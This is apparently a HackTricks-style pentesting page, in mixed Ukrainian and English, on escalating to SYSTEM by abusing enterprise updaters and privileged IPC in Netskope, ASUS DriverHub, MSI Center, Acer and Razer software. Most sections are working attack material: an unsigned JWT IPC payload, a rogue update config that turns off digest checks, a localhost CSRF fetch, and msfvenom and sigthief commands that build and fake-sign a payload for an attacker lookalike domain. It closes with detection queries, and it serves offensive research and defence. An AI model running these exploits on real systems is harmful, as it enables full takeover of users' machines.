# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка узагальнює клас ланцюгів Windows local privilege escalation, знайдених в enterprise endpoint agents та updaters, які надають low-friction IPC surface і privileged update flow. Репрезентативний приклад — Netskope Client for Windows < R129 (CVE-2025-0309), де користувач з низькими привілеями може примусити enrollment на сервер, контрольований атакувальником, а потім доставити malicious MSI, який встановлює SYSTEM service.

Ключові ідеї, які можна повторно використати проти подібних продуктів:
- Abuse privileged service’s localhost IPC, щоб примусити re-enrollment або reconfiguration на сервер атакувальника.
- Implement vendor’s update endpoints, deliver rogue Trusted Root CA, and point the updater to a malicious, “signed” package.
- Evade weak signer checks (CN allow-lists), optional digest flags, and lax MSI properties.
- If IPC is “encrypted”, derive the key/IV from world-readable machine identifiers stored in the registry.
- If the service restricts callers by image path/process name, inject into an allow-listed process or spawn one suspended and bootstrap your DLL via a minimal thread-context patch.

---
## 1) Примус enrollment на сервер атакувальника через localhost IPC

Багато agents постачають user-mode UI process, який спілкується з SYSTEM service через localhost TCP за допомогою JSON.

Спостерігалося в Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Craft JWT enrollment token, чиї claims контролюють backend host (наприклад, AddonUrl). Use alg=None so no signature is required.
2) Надішліть IPC message, що викликає provisioning command, з вашим JWT і tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Сервіс починає звертатися до вашого rogue server за enrollment/config, напр.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Примітки:
- Якщо caller verification базується на path/name, ініціюйте запит з allow-listed vendor binary (див. §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Після того як client звертається до вашого server, реалізуйте очікувані endpoints і перенаправте його на attacker MSI. Типова послідовність:

1) /v2/config/org/clientconfig → Поверніть JSON config з дуже коротким updater interval, напр.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Повертає PEM CA certificate. Служба встановлює його в Local Machine Trusted Root store.
3) /v2/checkupdate → Передайте metadata, що вказує на malicious MSI і фейкову версію.

Bypassing common checks seen in the wild:
- Signer CN allow-list: service може перевіряти лише, що Subject CN дорівнює “netSkope Inc” або “Netskope, Inc.”. Ваш rogue CA може видати leaf із цим CN і sign the MSI.
- CERT_DIGEST property: включіть benign MSI property з назвою CERT_DIGEST. На етапі install enforcement немає.
- Optional digest enforcement: config flag (наприклад, check_msi_digest=false) вимикає додаткову cryptographic validation.

Result: SYSTEM service встановлює ваш MSI з
C:\ProgramData\Netskope\stAgent\data\*.msi
виконуючи arbitrary code як NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

When facing a new endpoint agent or motherboard “helper” suite, a quick workflow is usually enough to tell whether you are looking at a promising privesc target:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Перелічіть candidate named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Здобути дані маршрутизації, що зберігаються в registry, які використовуються IPC servers на основі plugin-ів:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Спочатку витягніть назви endpoint, JSON keys і command IDs із user-mode client. Packed Electron/.NET frontends часто leak повну schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Полюйте на actual trust predicate, а не лише на code path, який зрештою запускає process:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns worth prioritizing:
- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` usually means “certificate exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks.
- Substring/suffix checks over `Origin`, `Referer`, download URLs, process names, or signer CNs are not authentication. `contains(".vendor.com")` is usually exploitable with attacker-controlled lookalike domains.
- If the low-privileged GUI decides “the file is trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses the boundary entirely (Razer-style split validation).
- If the broker copies a payload to `%TEMP%`/`C:\Windows\Temp` and then validates or schedules it from that path, immediately test for TOCTOU replacement windows and for sibling plugin modules that expose alternate `ExecuteTask()` wrappers with weaker checks.

For named-pipe-heavy targets, PipeViewer is a quick way to spot weak DACLs and remotely reachable pipes before you start reversing the protocol in depth.

If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Навіть PowerShell CLI, показаний нижче, успішно спрацьовує, коли заголовок Origin підмінено на довірене значення:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Будь-який візит браузера на сайт атакувальника, таким чином, стає 1-click (або 0-click через `onload`) local CSRF, яка запускає SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` завантажує arbitrary executables, визначені в JSON body, і кешує їх у `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Перевірка Download URL використовує ту саму substring logic, тож `http://updates.asus.com.attacker.tld:8000/payload.exe` приймається. Після завантаження ADU.exe лише перевіряє, що PE містить signature і що Subject string збігається з ASUS, перед запуском – без `WinVerifyTrust`, без chain validation.

Щоб weaponize цей flow:
1) Створіть payload (наприклад, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer у нього (наприклад, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Розмістіть `pwn.exe` на `.asus.com` lookalike domain і trigger UpdateApp через browser CSRF вище.

Оскільки і Origin, і URL filters базуються на substring, а signer check лише порівнює strings, DriverHub завантажує та виконує attacker binary у своєму elevated context.

---
## 1) TOCTOU всередині updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

SYSTEM service MSI Center exposes TCP protocol, де кожен frame це `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Його handler:
1) Копіює supplied executable до `C:\Windows\Temp\MSI Center SDK.exe`.
2) Перевіряє signature через `CS_CommonAPI.EX_CA::Verify` (certificate subject має дорівнювати “MICRO-STAR INTERNATIONAL, CO., LTD.”, і `WinVerifyTrust` має succeed).
3) Створює scheduled task, який запускає temp file як SYSTEM з attacker-controlled arguments.

Скопійований файл не locked між verification і `ExecuteTask()`. Attacker can:
- Надіслати Frame A, що вказує на legitimate MSI-signed binary (гарантує, що signature check pass і task queued).
- Race це repeated Frame B messages, які вказують на malicious payload, overwriting `MSI Center SDK.exe` одразу після завершення verification.

Коли scheduler спрацьовує, він виконує overwritten payload під SYSTEM, попри те, що був validated original file. Reliable exploitation використовує two goroutines/threads, які spam CMD_AutoUpdateSDK, доки TOCTOU window не буде won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Кожен plugin/DLL, завантажений `MSI.CentralServer.exe`, отримує Component ID, що зберігається в `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Перші 4 bytes frame обирають цей component, дозволяючи attackers route commands до arbitrary modules.
- Plugins можуть define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` і directly calls `API_Support.EX_Task::ExecuteTask()` без **no signature validation** – будь-який local user може вказати на `C:\Users\<user>\Desktop\payload.exe` і отримати SYSTEM execution deterministically.
- Sniffing loopback з Wireshark або instrumenting .NET binaries у dnSpy швидко reveal Component ↔ command mapping; custom Go/ Python clients then can replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and його discretionary ACL дозволяє remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- Client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that native handler maps this value to `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). Spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC навіть on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 додав ще один корисний pattern до цієї family: low-privileged user може попросити COM helper запустити process через `RzUtility.Elevator`, while trust decision delegated to user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Загальний висновок: під час реверсу “helper” suites не зупиняйтеся на localhost TCP або named pipes. Перевіряйте COM classes з назвами на кшталт `Elevator`, `Launcher`, `Updater`, або `Utility`, а потім з’ясовуйте, чи privileged service справді перевіряє цільовий binary сам по собі, чи лише довіряє результату, обчисленому patchable user-mode client DLL. Цей pattern поширюється далеко за межі Razer: будь-який split design, де high-privilege broker споживає allow/deny decision від low-privilege side, є кандидатом на privesc surface.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Між червнем 2025 і груднем 2025 attacker’и, які скомпрометували hosting infrastructure за update flow Notepad++, вибірково віддавали malicious manifests обраним victims. Старі WinGUp-based updaters не повністю verify update authenticity, тож hostile XML response міг redirect clients на attacker-controlled URLs. Оскільки client приймав HTTPS content без примусового контролю як trusted certificate chain, так і valid PE signature на downloaded installer, victims fetch’или й execute’или trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.
- Notepad++ responded by strengthening WinGUp in v8.8.9 and later: the returned XML is now signed (XMLDSig), and newer builds enforce certificate + signature verification of the downloaded installer instead of trusting the transport alone.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> запускає інсталятор, що не є Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Ці патерни узагальнюються на будь-який updater, який приймає unsigned manifests або не фіксує signer-ів інсталятора — network hijack + malicious installer + BYO-signed sideloading дає remote code execution під виглядом “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
